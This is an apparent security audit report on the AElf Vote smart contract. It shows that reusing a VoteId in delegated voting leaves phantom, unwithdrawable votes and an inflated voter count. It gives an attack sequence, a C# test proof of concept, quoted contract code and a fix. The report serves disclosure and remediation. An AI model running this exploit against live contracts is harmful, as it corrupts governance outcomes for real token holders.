# Audit Report

## Title
Vote Count Inflation via Duplicate VoteId in Delegated Voting

## Summary
The Vote contract allows sponsors of delegated voting items to submit multiple votes with the same VoteId, causing permanent vote count inflation without token backing. This violates the core voting integrity invariant that vote counts must accurately represent actual voting activity.

## Finding Description

The vulnerability exists in the delegated voting path where sponsors can provide arbitrary VoteIds without uniqueness validation.

**Vulnerable Code Path:**

1. **Missing VoteId Uniqueness Check**: For delegated voting (IsLockToken = false), the validation only verifies that the sponsor is the sender, Voter is non-null, and VoteId is non-null, but never validates VoteId uniqueness. [1](#0-0) 

2. **Overwriting VotingRecords**: When the same VoteId is used twice, the contract unconditionally overwrites the existing VotingRecord. [2](#0-1) 

3. **Unconditional Vote Count Increment**: The `UpdateVotingResult()` function always increments vote counts and votersCount without checking for duplicate VoteIds. [3](#0-2) 

4. **Duplicate ActiveVotes Entries**: The `UpdateVotedItems()` function adds VoteIds to ActiveVotes without duplicate detection. [4](#0-3) 

5. **Partial Withdrawal**: During withdrawal, only ONE instance is removed from ActiveVotes, and only the last record's amount is subtracted from vote counts. [5](#0-4) 

**Attack Sequence:**
1. Attacker calls `Register()` to create a delegated voting item (IsLockToken = false). Anyone can be a sponsor. [6](#0-5) 
2. Attacker calls `Vote(voteId="X", voter=Alice, amount=100, option="A")`
   - State: VotingRecords["X"] = {100, "A"}, Results["A"] = 100, votersCount = 1, ActiveVotes = ["X"]
3. Attacker calls `Vote(voteId="X", voter=Alice, amount=200, option="B")`
   - VotingRecords["X"] gets overwritten to {200, "B"}
   - Results["A"] stays 100, Results["B"] = 200, votersCount = 2
   - ActiveVotes = ["X", "X"] (duplicate added)
4. Attacker calls `Withdraw(voteId="X")`
   - Removes ONE "X" from ActiveVotes → ["X"] remains
   - Subtracts 200 from Results["B"] → 0
   - votersCount stays 2 (ActiveVotes.Any() is still true)
   - **Final corrupt state**: Results["A"] = 100 (phantom vote), votersCount = 2

## Impact Explanation

**Critical State Corruption:**
- **Permanent Vote Inflation**: Phantom votes remain in VotingResult without any token backing or withdrawable record
- **Metric Manipulation**: votersCount is artificially inflated, misrepresenting actual participation
- **Unwithdrawable Votes**: The first vote's data is permanently lost while its vote count persists
- **ActiveVotes Corruption**: Contains references to non-existent voting records

This breaks the fundamental voting invariant that vote totals must accurately reflect actual, withdrawable votes. While the Election contract implements its own safeguard [7](#0-6) , the base Vote contract is a public contract that can be used by other contracts or directly by users, and it lacks this protection.

## Likelihood Explanation

**High Likelihood:**
- Any user can call `Register()` to become a sponsor of a delegated voting item
- The `Vote()` function is publicly callable by the sponsor with arbitrary VoteId values
- No rate limiting, economic cost (beyond transaction fees), or duplicate detection exists
- The attack requires only simple repeated calls with the same VoteId
- No special timing or complex preconditions required
- The vulnerability creates valid-looking transactions that pass all existing checks

## Recommendation

Add VoteId uniqueness validation in the `AssertValidVoteInput()` function for delegated voting:

```csharp
if (!votingItem.IsLockToken)
{
    Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
    Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
    Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
    Assert(State.VotingRecords[input.VoteId] == null, "Vote Id already exists.");
}
```

## Proof of Concept

```csharp
[Fact]
public async Task VoteContract_DuplicateVoteId_Inflation_Test()
{
    // Register a delegated voting item (IsLockToken = false)
    var votingItem = await RegisterVotingItemAsync(10, 2, false, DefaultSender, 10);
    var optionA = votingItem.Options[0];
    var optionB = votingItem.Options[1];
    
    var voter = Accounts[1].Address;
    var duplicateVoteId = HashHelper.ComputeFrom("duplicate_vote_id");
    
    // First vote with voteId="X", option=A, amount=100
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        VoteId = duplicateVoteId,
        Voter = voter,
        Option = optionA,
        Amount = 100
    });
    
    // Check state after first vote
    var result1 = await GetVotingResult(votingItem.VotingItemId, 1);
    result1.Results[optionA].ShouldBe(100);
    result1.VotersCount.ShouldBe(1);
    
    // Second vote with SAME voteId="X", option=B, amount=200
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        VoteId = duplicateVoteId,
        Voter = voter,
        Option = optionB,
        Amount = 200
    });
    
    // Check state after second vote - BOTH options have votes
    var result2 = await GetVotingResult(votingItem.VotingItemId, 1);
    result2.Results[optionA].ShouldBe(100); // Phantom vote remains
    result2.Results[optionB].ShouldBe(200);
    result2.VotersCount.ShouldBe(2); // Inflated
    
    // Withdraw the vote
    await Withdraw(DefaultSenderKeyPair, duplicateVoteId);
    
    // Check final state - phantom vote persists
    var result3 = await GetVotingResult(votingItem.VotingItemId, 1);
    result3.Results[optionA].ShouldBe(100); // PHANTOM VOTE REMAINS
    result3.Results[optionB].ShouldBe(0);
    result3.VotersCount.ShouldBe(2); // STILL INFLATED (should be 0)
    
    // Verify voting record corruption
    var votedItems = await GetVotedItems(voter);
    var activeVotes = votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].ActiveVotes;
    activeVotes.Count.ShouldBe(1); // Still has one reference
    activeVotes.Contains(duplicateVoteId).ShouldBeTrue();
}
```

**Notes:**
- This vulnerability only affects delegated voting scenarios (IsLockToken = false) where the sponsor provides VoteIds
- The Election contract has its own duplicate check, but other consumers of the Vote contract lack this protection
- The attack creates permanent state corruption that cannot be resolved without contract upgrade
- Vote counts become unreliable for any decision-making that depends on accurate voting metrics

### Citations

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L20-82)
```csharp
    public override Empty Register(VotingRegisterInput input)
    {
        var votingItemId = AssertValidNewVotingItem(input);

        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        // Accepted currency is in white list means this token symbol supports voting.
        var isInWhiteList = State.TokenContract.IsInWhiteList.Call(new IsInWhiteListInput
        {
            Symbol = input.AcceptedCurrency,
            Address = Context.Self
        }).Value;
        Assert(isInWhiteList, "Claimed accepted token is not available for voting.");

        // Initialize voting event.
        var votingItem = new VotingItem
        {
            Sponsor = Context.Sender,
            VotingItemId = votingItemId,
            AcceptedCurrency = input.AcceptedCurrency,
            IsLockToken = input.IsLockToken,
            TotalSnapshotNumber = input.TotalSnapshotNumber,
            CurrentSnapshotNumber = 1,
            CurrentSnapshotStartTimestamp = input.StartTimestamp,
            StartTimestamp = input.StartTimestamp,
            EndTimestamp = input.EndTimestamp,
            RegisterTimestamp = Context.CurrentBlockTime,
            Options = { input.Options },
            IsQuadratic = input.IsQuadratic,
            TicketCost = input.TicketCost
        };

        State.VotingItems[votingItemId] = votingItem;

        // Initialize first voting going information of registered voting event.
        var votingResultHash = GetVotingResultHash(votingItemId, 1);
        State.VotingResults[votingResultHash] = new VotingResult
        {
            VotingItemId = votingItemId,
            SnapshotNumber = 1,
            SnapshotStartTimestamp = input.StartTimestamp
        };

        Context.Fire(new VotingItemRegistered
        {
            Sponsor = votingItem.Sponsor,
            VotingItemId = votingItemId,
            AcceptedCurrency = votingItem.AcceptedCurrency,
            IsLockToken = votingItem.IsLockToken,
            TotalSnapshotNumber = votingItem.TotalSnapshotNumber,
            CurrentSnapshotNumber = votingItem.CurrentSnapshotNumber,
            CurrentSnapshotStartTimestamp = votingItem.StartTimestamp,
            StartTimestamp = votingItem.StartTimestamp,
            EndTimestamp = votingItem.EndTimestamp,
            RegisterTimestamp = votingItem.RegisterTimestamp,
            IsQuadratic = votingItem.IsQuadratic,
            TicketCost = votingItem.TicketCost
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L117-117)
```csharp
        State.VotingRecords[input.VoteId] = votingRecord;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L146-161)
```csharp
    private void UpdateVotedItems(Hash voteId, Address voter, VotingItem votingItem)
    {
        var votedItems = State.VotedItemsMap[voter] ?? new VotedItems();
        var voterItemIndex = votingItem.VotingItemId.ToHex();
        if (votedItems.VotedItemVoteIds.ContainsKey(voterItemIndex))
            votedItems.VotedItemVoteIds[voterItemIndex].ActiveVotes.Add(voteId);
        else
            votedItems.VotedItemVoteIds[voterItemIndex] =
                new VotedIds
                {
                    ActiveVotes = { voteId }
                };

        votedItems.VotedItemVoteIds[voterItemIndex].WithdrawnVotes.Remove(voteId);
        State.VotedItemsMap[voter] = votedItems;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L169-181)
```csharp
    private void UpdateVotingResult(VotingItem votingItem, string option, long amount)
    {
        // Update VotingResult based on this voting behaviour.
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        if (!votingResult.Results.ContainsKey(option)) votingResult.Results.Add(option, 0);

        var currentVotes = votingResult.Results[option];
        votingResult.Results[option] = currentVotes.Add(amount);
        votingResult.VotersCount = votingResult.VotersCount.Add(1);
        votingResult.VotesAmount = votingResult.VotesAmount.Add(amount);
        State.VotingResults[votingResultHash] = votingResult;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L191-239)
```csharp
    public override Empty Withdraw(WithdrawInput input)
    {
        var votingRecord = State.VotingRecords[input.VoteId];
        if (votingRecord == null) throw new AssertionException("Voting record not found.");
        var votingItem = State.VotingItems[votingRecord.VotingItemId];

        if (votingItem.IsLockToken)
            Assert(votingRecord.Voter == Context.Sender, "No permission to withdraw votes of others.");
        else
            Assert(votingItem.Sponsor == Context.Sender, "No permission to withdraw votes of others.");

        // Update VotingRecord.
        votingRecord.IsWithdrawn = true;
        votingRecord.WithdrawTimestamp = Context.CurrentBlockTime;
        State.VotingRecords[input.VoteId] = votingRecord;

        var votingResultHash = GetVotingResultHash(votingRecord.VotingItemId, votingRecord.SnapshotNumber);

        var votedItems = State.VotedItemsMap[votingRecord.Voter];
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].ActiveVotes.Remove(input.VoteId);
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].WithdrawnVotes.Add(input.VoteId);
        State.VotedItemsMap[votingRecord.Voter] = votedItems;

        var votingResult = State.VotingResults[votingResultHash];
        votingResult.Results[votingRecord.Option] =
            votingResult.Results[votingRecord.Option].Sub(votingRecord.Amount);
        if (!votedItems.VotedItemVoteIds[votingRecord.VotingItemId.ToHex()].ActiveVotes.Any())
            votingResult.VotersCount = votingResult.VotersCount.Sub(1);

        votingResult.VotesAmount = votingResult.VotesAmount.Sub(votingRecord.Amount);

        State.VotingResults[votingResultHash] = votingResult;

        if (votingItem.IsLockToken)
            State.TokenContract.Unlock.Send(new UnlockInput
            {
                Address = votingRecord.Voter,
                Symbol = votingItem.AcceptedCurrency,
                Amount = votingRecord.Amount,
                LockId = input.VoteId
            });

        Context.Fire(new Withdrawn
        {
            VoteId = input.VoteId
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L384-389)
```csharp
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L433-433)
```csharp
        Assert(State.LockTimeMap[voteId] == 0, "Vote already exists.");
```
